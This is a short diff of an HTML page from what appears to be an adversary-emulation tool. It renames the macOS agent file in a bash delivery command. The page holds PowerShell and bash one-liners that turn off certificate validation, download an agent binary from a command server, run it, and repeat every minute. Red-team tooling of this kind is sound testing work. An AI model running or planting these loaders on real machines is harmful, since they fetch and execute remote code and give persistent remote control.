@@ -46,7 +46,7 @@
                             <br>
                             <div>
                                 <pre id="pshDelivery">while($true) {[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True}; $url="https://localhost:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("file","sandcat.exe"); $output="C:\Users\Public\sandcat.exe"; $wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe https://localhost:8888 my_group; sleep 60}</pre>
-                                <pre id="bashDelivery">while true; do curl -sk -X POST -H 'file:sandcat-osx' https://localhost:8888/file/download > /tmp/sandcat-osx && chmod +x /tmp/sandcat-osx && /tmp/sandcat-osx https://localhost:8888 my_group; sleep 60; done</pre>
+                                <pre id="bashDelivery">while true; do curl -sk -X POST -H 'file:sandcat-darwin' https://localhost:8888/file/download > /tmp/sandcat-osx && chmod +x /tmp/sandcat-osx && /tmp/sandcat-osx https://localhost:8888 my_group; sleep 60; done</pre>
                             </div>
                         </div>
                     </center>
